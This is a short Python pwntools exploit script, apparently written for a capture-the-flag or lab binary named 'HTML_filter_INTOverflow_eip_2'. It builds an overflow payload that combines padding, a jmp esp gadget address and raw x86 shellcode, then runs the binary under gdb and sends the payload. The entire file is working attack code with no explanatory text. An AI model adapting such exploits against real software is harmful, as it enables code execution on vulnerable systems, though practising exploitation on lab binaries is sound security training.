from pwn import *
import base64


shellcode = "\x31\xdb\xf7\xe3\x53h@\xa0\x0e\x08Y\xb2\x04\xb0\x03\xcd\x80"+p32(0)


jmp_esp = 0x080e2d8f

eip = 0x78777675

payload = '<'+'a'*(0x7fc8)+p32(jmp_esp)+shellcode
payload +="a"*(0x801F-len(payload))
payload +=p32(0x41424344)
#payload = '<'+'1'*(0x7ff0)


# print payload

p = process('./HTML_filter_INTOverflow_eip_2')

gdb.attach(p,"b *0x8048fc2\nc")

# raw_input()
import base64
print base64.b64encode(payload)

p.send(payload)



p.interactive()
